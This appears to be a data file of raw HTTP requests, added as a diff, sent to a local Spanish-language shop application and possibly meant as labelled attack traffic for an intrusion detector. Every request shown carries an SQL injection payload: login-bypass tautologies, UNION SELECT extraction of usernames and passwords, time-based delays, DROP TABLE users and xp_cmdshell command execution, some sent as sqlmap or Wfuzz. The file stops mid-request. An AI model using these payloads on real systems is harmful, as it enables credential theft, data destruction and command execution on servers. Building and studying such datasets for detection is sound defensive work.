@@ -1,0 +1,1401 @@
+GET /tienda1/anadir.jsp?categoria=1%3B%20DROP%20TABLE%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+
+categoria=1+WAITFOR+DELAY+%270%3A0%3A5%27+--&usr_login=grace&usr_passwd=hello2024
+
+GET /tienda1/publico/buscar.jsp?q=%27%20OR%20%271%27%3D%271&offset=9 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?id=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--&offset=8 HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?categoria=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?categoria=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Wfuzz/2.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?texto=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/articulo.jsp?texto=1%20AND%20SLEEP%285%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+
+search=1%3B+DROP+TABLE+users+--&usr_login=grace&usr_passwd=dragon88
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+
+texto=admin%27+--
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+
+file=1+WAITFOR+DELAY+%270%3A0%3A5%27+--&usr_login=grace&usr_passwd=abc12345
+
+GET /index.html?cmd=admin%27%20--&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+file=1+OR+1%3D1+%23&usr_login=bob&usr_passwd=letmein
+
+GET /tienda1/publico/caracteristicas.jsp?file=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?id=1%3B%20DROP%20TABLE%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?id=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?id=%27%20OR%20%27%27%3D%27 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+usuario=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--
+
+GET /tienda1/publico/buscar.jsp?usuario=1%20OR%201%3D1%20%23&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+
+page=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+
+page=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=eve&usr_passwd=letmein
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+cmd=%27+OR+%271%27%3D%271
+
+GET /tienda1/anadir.jsp?name=1%20OR%201%3D1%20%23 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+
+name=1+UNION+SELECT+username%2C+password+FROM+users+--
+
+GET /tienda1/anadir.jsp?texto=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+categoria=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--&usr_login=carol&usr_passwd=dragon88
+
+GET /tienda1/publico/listado.jsp?name=1%27%20OR%20%271%27%3D%271%27%20--&offset=8 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?id=1%20OR%201%3D1%20%23 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Wfuzz/2.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+search=%27+OR+%271%27%3D%271&usr_login=frank&usr_passwd=abc12345
+
+GET /tienda1/publico/buscar.jsp?q=1%20OR%201%3D1%20%23 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+usuario=admin%27+--&usr_login=carol&usr_passwd=abc12345
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+name=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--&usr_login=dave&usr_passwd=hello2024
+
+GET /index.html?texto=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20--&offset=1 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+
+id=1+OR+1%3D1+%23
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+categoria=%27+OR+%271%27%3D%271&usr_login=eve&usr_passwd=letmein
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+
+file=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=bob&usr_passwd=hello2024
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+usuario=%27+OR+%27%27%3D%27
+
+GET /index.html?search=1%27%20OR%20%271%27%3D%271%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+texto=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--&usr_login=henry&usr_passwd=qwerty
+
+GET /tienda1/publico/articulo.jsp?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+
+q=1+UNION+SELECT+username%2C+password+FROM+users+--
+
+GET /tienda1/publico/caracteristicas.jsp?file=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20--&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?page=1%20AND%20SLEEP%285%29%20--&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 63
+
+texto=%27+OR+%271%27%3D%271&usr_login=henry&usr_passwd=dragon88
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 92
+
+q=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--&usr_login=henry&usr_passwd=abc12345
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Wfuzz/2.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+q=%27+OR+%27%27%3D%27&usr_login=alice&usr_passwd=qwerty
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+
+cmd=1+WAITFOR+DELAY+%270%3A0%3A5%27+--&usr_login=frank&usr_passwd=dragon88
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+name=admin%27+--&usr_login=bob&usr_passwd=abc12345
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+
+cmd=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--
+
+GET /tienda1/anadir.jsp?cmd=1%20OR%201%3D1%20%23&offset=4 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+
+cmd=1+UNION+SELECT+username%2C+password+FROM+users+--&usr_login=carol&usr_passwd=dragon88
+
+GET /tienda1/publico/listado.jsp?page=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--&offset=5 HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+search=1+OR+1%3D1+%23&usr_login=henry&usr_passwd=dragon88
+
+GET /tienda1/publico/listado.jsp?id=admin%27%20--&offset=7 HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+file=1%27+OR+%271%27%3D%271%27+--
+
+GET /tienda1/publico/articulo.jsp?search=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+
+categoria=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=dave&usr_passwd=pass123
+
+GET /tienda1/anadir.jsp?q=1%20OR%201%3D1%20%23&offset=3 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?search=1%27%20OR%20%271%27%3D%271%27%20--&offset=7 HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/listado.jsp?id=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?usuario=admin%27%20--&offset=8 HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+
+categoria=1+OR+1%3D1+%23
+
+GET /tienda1/anadir.jsp?texto=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20--&offset=10 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+
+cmd=1+OR+1%3D1+%23
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+categoria=%27+OR+%27%27%3D%27
+
+GET /tienda1/publico/caracteristicas.jsp?usuario=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?texto=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?page=1%20OR%201%3D1%20%23 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
